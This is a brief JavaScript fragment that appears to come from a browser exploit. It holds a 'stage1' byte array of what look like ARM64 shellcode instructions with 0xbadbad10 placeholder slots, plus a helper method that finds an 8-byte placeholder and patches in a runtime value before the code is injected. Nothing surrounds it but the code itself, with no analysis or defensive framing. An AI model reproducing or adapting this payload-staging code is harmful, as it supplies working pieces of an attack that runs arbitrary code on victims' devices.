var stage1 = new Uint8Array([128,0,0,88,5,0,0,20,192,3,95,214,0,0,0,0,16,173,219,186,16,173,219,186,253,123,191,169,253,3,0,145,232,35,159,146,40,122,191,242,8,0,8,139,96,0,128,82,0,1,63,214,168,213,155,82,168,213,187,114,233,102,130,82,9,1,0,249,0,0,128,82,253,123,193,168,192,3,95,214]);

stage1.replace = function(oldVal, newVal) {
    for (var idx = 0; idx < this.length; idx++) {
        var found = true;
        for (var j = idx; j < idx + 8; j++) {
            if (this[j] != oldVal.byteAt(j - idx)) {
                found = false;
                break;
            }
        }
        if (found)
            break;
    }
    this.set(newVal.bytes(), idx);
};
